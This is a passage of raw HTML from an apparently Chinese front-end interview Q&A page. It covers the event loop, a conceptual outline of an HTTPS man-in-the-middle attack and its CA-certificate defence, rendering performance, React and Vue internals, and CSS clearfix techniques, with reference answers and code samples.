href="#8、浏览器和-Node-事件循环的区别？" class="headerlink" title="8、浏览器和 Node 事件循环的区别？"></a>8、浏览器和 Node 事件循环的区别？</h3><p><code>参考答案</code>  </p><p>其中一个主要的区别在于浏览器的event loop 和nodejs的event loop 在处理异步事件的顺序是不同的,nodejs中有micro event;其中Promise属于micro event 该异步事件的处理顺序就和浏览器不同.nodejs V11.0以上 这两者之间的顺序就相同了.</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> test <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'children2'</span><span class="token punctuation">)</span>        Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'children2-1'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'children3'</span><span class="token punctuation">)</span>        Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'children3-1'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'children1'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 以上代码在node11以下版本的执行结果(先执行所有的宏任务，再执行微任务)</span><span class="token comment" spellcheck="true">// start</span><span class="token comment" spellcheck="true">// end</span><span class="token comment" spellcheck="true">// children1</span><span class="token comment" spellcheck="true">// children2</span><span class="token comment" spellcheck="true">// children3</span><span class="token comment" spellcheck="true">// children2-1</span><span class="token comment" spellcheck="true">// children3-1</span><span class="token comment" spellcheck="true">// 以上代码在node11及浏览器的执行结果(顺序执行宏任务和微任务)</span><span class="token comment" spellcheck="true">// start</span><span class="token comment" spellcheck="true">// end</span><span class="token comment" spellcheck="true">// children1</span><span class="token comment" spellcheck="true">// children2</span><span class="token comment" spellcheck="true">// children2-1</span><span class="token comment" spellcheck="true">// children3</span><span class="token comment" spellcheck="true">// children3-1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="9、简述HTTPS中间人攻击"><a href="#9、简述HTTPS中间人攻击" class="headerlink" title="9、简述HTTPS中间人攻击"></a>9、简述HTTPS中间人攻击</h3><p><code>参考答案</code>  </p><p>https协议由 http + ssl 协议构成，具体的链接过程可参考<a href="https://github.com/lvwxx/blog/issues/3" target="_blank" rel="noopener">SSL或TLS握手的概述</a></p><p>中间人攻击过程如下：</p><ol><li>服务器向客户端发送公钥。</li><li>攻击者截获公钥，保留在自己手上。</li><li>然后攻击者自己生成一个【伪造的】公钥，发给客户端。</li><li>客户端收到伪造的公钥后，生成加密hash值发给服务器。</li><li>攻击者获得加密hash值，用自己的私钥解密获得真秘钥。</li><li>同时生成假的加密hash值，发给服务器。</li><li>服务器用私钥解密获得假秘钥。</li><li>服务器用加秘钥加密传输信息</li></ol><p>防范方法：</p><ol><li>服务端在发送浏览器的公钥中加入CA证书，浏览器可以验证CA证书的有效性</li></ol><h3 id="10、说几条web前端优化策略"><a href="#10、说几条web前端优化策略" class="headerlink" title="10、说几条web前端优化策略"></a>10、说几条web前端优化策略</h3><p><code>参考答案</code>  </p><p>(1). 减少HTTP请求数</p><p>这条策略基本上所有前端人都知道，而且也是最重要最有效的。都说要减少HTTP请求，那请求多了到底会怎么样呢？首先，每个请求都是有成本的，既包 含时间成本也包含资源成本。一个完整的请求都需要经过DNS寻址、与服务器建立连接、发送数据、等待服务器响应、接收数据这样一个“漫长”而复杂的过程。 时间成本就是用户需要看到或者“感受”到这个资源是必须要等待这个过程结束的，资源上由于每个请求都需要携带数据，因此每个请求都需要占用带宽。</p><p>另外，由于浏览器进行并发请求的请求数是有上限的，因此请求数多了以后，浏览器需要分批进行请求，因此会增加用户的等待时间，会给 用户造成站点速度慢这样一个印象，即使可能用户能看到的第一屏的资源都已经请求完了，但是浏览器的进度条会一直存在。减少HTTP请求数的主要途径包括：</p><p>(2). 从设计实现层面简化页面</p><p>如果你的页面像百度首页一样简单，那么接下来的规则基本上都用不着了。保持页面简洁、减少资源的使用时最直接的。如果不是这样，你的页面需要华丽的皮肤，则继续阅读下面的内容。</p><p>(3). 合理设置HTTP缓存</p><p>缓存的力量是强大的，恰当的缓存设置可以大大的减少HTTP请求。以有啊首页为例，当浏览器没有缓存的时候访问一共会发出78个请求，共600多K 数据（如图1.1），而当第二次访问即浏览器已缓存之后访问则仅有10个请求，共20多K数据（如图1.2）。（这里需要说明的是，如果直接F5刷新页面 的话效果是不一样的，这种情况下请求数还是一样，不过被缓存资源的请求服务器是304响应，只有Header没有Body，可以节省带宽）</p><p>怎样才算合理设置？原则很简单，能缓存越多越好，能缓存越久越好。例如，很少变化的图片资源可以直接通过HTTP Header中的Expires设置一个很长的过期头；变化不频繁而又可能会变的资源可以使用Last-Modifed来做请求验证。尽可能的让资源能够 在缓存中待得更久。</p><p>(4). 资源合并与压缩</p><p>如果可以的话，尽可能的将外部的脚本、样式进行合并，多个合为一个。另外，CSS、Javascript、Image都可以用相应的工具进行压缩，压缩后往往能省下不少空间。</p><p>(5). CSS Sprites</p><p>合并CSS图片，减少请求数的又一个好办法。</p><p>(6). Inline Images</p><p>使用data: URL scheme的方式将图片嵌入到页面或CSS中，如果不考虑资源管理上的问题的话，不失为一个好办法。如果是嵌入页面的话换来的是增大了页面的体积，而且无法利用浏览器缓存。使用在CSS中的图片则更为理想一些。</p><p>(7). Lazy Load Images</p><p>这条策略实际上并不一定能减少HTTP请求数，但是却能在某些条件下或者页面刚加载时减少HTTP请求数。对于图片而言，在页面刚加载的时候可以只 加载第一屏，当用户继续往后滚屏的时候才加载后续的图片。这样一来，假如用户只对第一屏的内容感兴趣时，那剩余的图片请求就都节省了。有啊首页曾经的做法 是在加载的时候把第一屏之后的图片地址缓存在Textarea标签中，待用户往下滚屏的时候才“惰性”加载。</p><h3 id="11、你了解的浏览器的重绘和回流导致的性能问题"><a href="#11、你了解的浏览器的重绘和回流导致的性能问题" class="headerlink" title="11、你了解的浏览器的重绘和回流导致的性能问题"></a>11、你了解的浏览器的重绘和回流导致的性能问题</h3><p><code>参考答案</code>  </p><p><strong>重绘（Repaint）和回流（Reflow）</strong></p><p>重绘和回流是渲染步骤中的一小节，但是这两个步骤对于性能影响很大。</p><ul><li>重绘是当节点需要更改外观而不会影响布局的，比如改变 <code>color</code>就叫称为重绘</li><li>回流是布局或者几何属性需要改变就称为回流。</li></ul><p>回流必定会发生重绘，重绘不一定会引发回流。回流所需的成本比重绘高的多，改变深层次的节点很可能导致父节点的一系列回流。</p><p>所以以下几个动作可能会导致性能问题：</p><ul><li>改变 window 大小</li><li>改变字体</li><li>添加或删除样式</li><li>文字改变</li><li>定位或者浮动</li><li>盒模型</li></ul><p>很多人不知道的是，重绘和回流其实和 Event loop 有关。</p><ol><li>当 Event loop 执行完 Microtasks 后，会判断 document 是否需要更新。因为浏览器是 60Hz 的刷新率，每 16ms 才会更新一次。</li><li>然后判断是否有 <code>resize</code>或者 <code>scroll</code>，有的话会去触发事件，所以 <code>resize</code>和 <code>scroll</code>事件也是至少 16ms 才会触发一次，并且自带节流功能。</li><li>判断是否触发了 media query</li><li>更新动画并且发送事件</li><li>判断是否有全屏操作事件</li><li>执行 <code>requestAnimationFrame</code>回调</li><li>执行 <code>IntersectionObserver</code>回调，该方法用于判断元素是否可见，可以用于懒加载上，但是兼容性不好</li><li>更新界面</li><li>以上就是一帧中可能会做的事情。如果在一帧中有空闲时间，就会去执行 <code>requestIdleCallback</code>回调。</li></ol><p><strong>减少重绘和回流</strong></p><ul><li><p>使用 <code>translate</code> 替代 <code>top</code></p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token selector"><span class="token class">.test</span> </span><span class="token punctuation">{</span>        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>        <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>        <span class="token property">background</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 引起回流</span>        document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.test'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>top <span class="token operator">=</span> <span class="token string">'100px'</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><ul><li><p>使用 <code>visibility</code>替换 <code>display: none</code>，因为前者只会引起重绘，后者会引发回流（改变了布局）</p><p>把 DOM 离线后修改，比如：先把 DOM 给 <code>display:none</code>(有一次 Reflow)，然后你修改100次，然后再把它显示出来</p><p>不要把 DOM 结点的属性值放在一个循环里当成循环里的变量</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 获取 offsetTop 会导致回流，因为需要去获取正确的值</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.test'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>offsetTop<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>不要使用 table 布局，可能很小的一个小改动会造成整个 table 的重新布局</p></li><li><p>动画实现的速度的选择，动画速度越快，回流次数越多，也可以选择使用 <code>requestAnimationFrame</code></p></li><li><p>CSS 选择符从右往左匹配查找，避免 DOM 深度过深</p></li><li><p>将频繁运行的动画变为图层，图层能够阻止该节点回流影响别的元素。比如对于 <code>video</code>标签，浏览器会自动将该节点变为图层。</p></li></ul><h2 id="react、Vue"><a href="#react、Vue" class="headerlink" title="react、Vue"></a>react、Vue</h2><h3 id="1、写-React-Vue-项目时为什么要在列表组件中写-key，其作用是什么？"><a href="#1、写-React-Vue-项目时为什么要在列表组件中写-key，其作用是什么？" class="headerlink" title="1、写 React / Vue 项目时为什么要在列表组件中写 key，其作用是什么？"></a>1、写 React / Vue 项目时为什么要在列表组件中写 key，其作用是什么？</h3><p><code>参考答案</code></p><p>vue和react都是采用diff算法来对比新旧虚拟节点，从而更新节点。在vue的diff函数中（建议先了解一下diff算法过程）。<br>在交叉对比中，当新节点跟旧节点<code>头尾交叉对比</code>没有结果时，会根据新节点的key去对比旧节点数组中的key，从而找到相应旧节点（这里对应的是一个key =&gt; index 的map映射）。如果没找到就认为是一个新增节点。而如果没有key，那么就会采用遍历查找的方式去找到对应的旧节点。一种一个map映射，另一种是遍历查找。相比而言。map映射的速度更快。<br>vue部分源码如下：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// vue项目  src/core/vdom/patch.js  -488行</span><span class="token comment" spellcheck="true">// 以下是为了阅读性进行格式化后的代码</span><span class="token comment" spellcheck="true">// oldCh 是一个旧虚拟节点数组</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isUndef</span><span class="token punctuation">(</span>oldKeyToIdx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  oldKeyToIdx <span class="token operator">=</span> <span class="token function">createKeyToOldIdx</span><span class="token punctuation">(</span>oldCh<span class="token punctuation">,</span> oldStartIdx<span class="token punctuation">,</span> oldEndIdx<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>newStartVnode<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// map 方式获取</span>  idxInOld <span class="token operator">=</span> oldKeyToIdx<span class="token punctuation">[</span>newStartVnode<span class="token punctuation">.</span>key<span class="token punctuation">]</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 遍历方式获取</span>  idxInOld <span class="token operator">=</span> <span class="token function">findIdxInOld</span><span class="token punctuation">(</span>newStartVnode<span class="token punctuation">,</span> oldCh<span class="token punctuation">,</span> oldStartIdx<span class="token punctuation">,</span> oldEndIdx<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建map函数</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> createKeyToOldIdx <span class="token punctuation">(</span>children<span class="token punctuation">,</span> beginIdx<span class="token punctuation">,</span> endIdx<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> i<span class="token punctuation">,</span> key  <span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> beginIdx<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> endIdx<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>    key <span class="token operator">=</span> children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>key    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> map<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> i  <span class="token punctuation">}</span>  <span class="token keyword">return</span> map<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>遍历寻找</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// sameVnode 是对比新旧节点是否相同的函数</span> <span class="token keyword">function</span> findIdxInOld <span class="token punctuation">(</span>node<span class="token punctuation">,</span> oldCh<span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> end<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> c <span class="token operator">=</span> oldCh<span class="token punctuation">[</span>i<span class="token punctuation">]</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sameVnode</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> i    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、React-中-setState-什么时候是同步的，什么时候是异步的？"><a href="#2、React-中-setState-什么时候是同步的，什么时候是异步的？" class="headerlink" title="2、React 中 setState 什么时候是同步的，什么时候是异步的？"></a>2、React 中 setState 什么时候是同步的，什么时候是异步的？</h3><p><code>参考答案</code>  </p><p>在React中，<strong>如果是由React引发的事件处理（比如通过onClick引发的事件处理），调用setState不会同步更新this.state，除此之外的setState调用会同步执行this.state</strong>。所谓“除此之外”，指的是绕过React通过addEventListener直接添加的事件处理函数，还有通过setTimeout/setInterval产生的异步调用。</p><p><strong>原因：</strong>在React的setState函数实现中，会根据一个变量isBatchingUpdates判断是直接更新this.state还是放到队列中回头再说，而isBatchingUpdates默认是false，也就表示setState会同步更新this.state，但是，<strong>有一个函数batchedUpdates，这个函数会把isBatchingUpdates修改为true，而当React在调用事件处理函数之前就会调用这个batchedUpdates，造成的后果，就是由React控制的事件处理过程setState不会同步更新this.state</strong>。</p><h3 id="3、下面输出什么"><a href="#3、下面输出什么" class="headerlink" title="3、下面输出什么"></a>3、下面输出什么</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>      val<span class="token punctuation">:</span> <span class="token number">0</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">componentDidMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>val<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 第 1 次 log</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>val<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 第 2 次 log</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>val<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 第 3 次 log</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>val<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 第 4 次 log</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-js"><code class="language-js"><span class="token number">1</span>、第一次和第二次都是在 react 自身生命周期内，触发时 isBatchingUpdates 为 <span class="token boolean">true</span>，所以并不会直接执行更新 state，而是加入了 dirtyComponents，所以打印时获取的都是更新前的状态 <span class="token number">0</span>。<span class="token number">2</span>、两次 setState 时，获取到 <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val 都是 <span class="token number">0</span>，所以执行时都是将 <span class="token number">0</span> 设置成 <span class="token number">1</span>，在 react 内部会被合并掉，只执行一次。设置完成后 state<span class="token punctuation">.</span>val 值为 <span class="token number">1</span>。<span class="token number">3</span>、setTimeout 中的代码，触发时 isBatchingUpdates 为 <span class="token boolean">false</span>，所以能够直接进行更新，所以连着输出 <span class="token number">2</span>，<span class="token number">3</span>。输出： <span class="token number">0</span> <span class="token number">0</span> <span class="token number">2</span> <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4、为什么虚拟dom会提高性能"><a href="#4、为什么虚拟dom会提高性能" class="headerlink" title="4、为什么虚拟dom会提高性能?"></a>4、为什么虚拟dom会提高性能?</h3><p><code>参考答案</code>  </p><p>虚拟dom相当于在js和真实dom中间加了一个缓存，利用dom diff算法避免了没有必要的dom操作，从而提高性能。</p><p>具体实现步骤如下：</p><p>用 JavaScript 对象结构表示 DOM 树的结构；然后用这个树构建一个真正的 DOM 树，插到文档当中</p><p>当状态变更的时候，重新构造一棵新的对象树。然后用新的树和旧的树进行比较，记录两棵树差异</p><p>把2所记录的差异应用到步骤1所构建的真正的DOM树上，视图就更新了。</p><h2 id="css"><a href="#css" class="headerlink" title="css"></a>css</h2><h3 id="1、分析比较-opacity-0、visibility-hidden、display-none-优劣和适用场景"><a href="#1、分析比较-opacity-0、visibility-hidden、display-none-优劣和适用场景" class="headerlink" title="1、分析比较 opacity: 0、visibility: hidden、display: none 优劣和适用场景"></a>1、分析比较 opacity: 0、visibility: hidden、display: none 优劣和适用场景</h3><p><code>参考答案</code></p><p>结构：<br>display:none: 会让元素完全从渲染树中消失，渲染的时候不占据任何空间, 不能点击，<br>visibility: hidden:不会让元素从渲染树消失，渲染元素继续占据空间，只是内容不可见，不能点击<br>opacity: 0: 不会让元素从渲染树消失，渲染元素继续占据空间，只是内容不可见，可以点击</p><p>继承：<br>display: none和opacity: 0：是非继承属性，子孙节点消失由于元素从渲染树消失造成，通过修改子孙节点属性无法显示。<br>visibility: hidden：是继承属性，子孙节点消失由于继承了hidden，通过设置visibility: visible;可以让子孙节点显式。</p><p>性能：<br>displaynone : 修改元素会造成文档回流,读屏器不会读取display: none元素内容，性能消耗较大<br>visibility:hidden: 修改元素只会造成本元素的重绘,性能消耗较少读屏器读取visibility: hidden元素内容<br>opacity: 0 ： 修改元素会造成重绘，性能消耗较少</p><p>联系：它们都能让元素不可见</p><h3 id="2、清除浮动的方式有哪些-比较好的是哪一种"><a href="#2、清除浮动的方式有哪些-比较好的是哪一种" class="headerlink" title="2、清除浮动的方式有哪些?比较好的是哪一种?"></a>2、清除浮动的方式有哪些?比较好的是哪一种?</h3><p><code>参考答案</code></p><p>常用的一般为三种<code>.clearfix</code>, <code>clear:both</code>,<code>overflow:hidden</code>;</p><p>比较好是 <code>.clearfix</code>,伪元素万金油版本,后两者有局限性.</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">.</span>clearfix<span class="token punctuation">:</span>after <span class="token punctuation">{</span>  visibility<span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>  display<span class="token punctuation">:</span> block<span class="token punctuation">;</span>  font<span class="token operator">-</span>size<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  content<span class="token punctuation">:</span> <span class="token string">" "</span><span class="token punctuation">;</span>  clear<span class="token punctuation">:</span> both<span class="token punctuation">;</span>  height<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>为毛没有 zoom <span class="token punctuation">,</span>_height 这些<span class="token punctuation">,</span>IE6<span class="token punctuation">,</span><span class="token number">7</span>这类需要 csshack 不再我们考虑之内了<span class="token punctuation">.</span>clearfix 还有另外一种写法<span class="token punctuation">,</span><span class="token operator">--</span><span class="token operator">></span><span class="token punctuation">.</span>clearfix<span class="token punctuation">:</span>before<span class="token punctuation">,</span> <span class="token punctuation">.</span>clearfix<span class="token punctuation">:</span>after <span class="token punctuation">{</span>    content<span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>    display<span class="token punctuation">:</span>table<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span>clearfix<span class="token punctuation">:</span>after<span class="token punctuation">{</span>    clear<span class="token punctuation">:</span>both<span class="token punctuation">;</span>    overflow<span class="token punctuation">:</span>hidden<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span>clearfix<span class="token punctuation">{</span>    zoom<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>用display<span class="token punctuation">:</span>table 是为了避免外边距margin重叠导致的margin塌陷<span class="token punctuation">,</span>内部元素默认会成为 table<span class="token operator">-</span>cell 单元格的形式<span class="token operator">--</span><span class="token operator">></span><span aria-hidden="true" 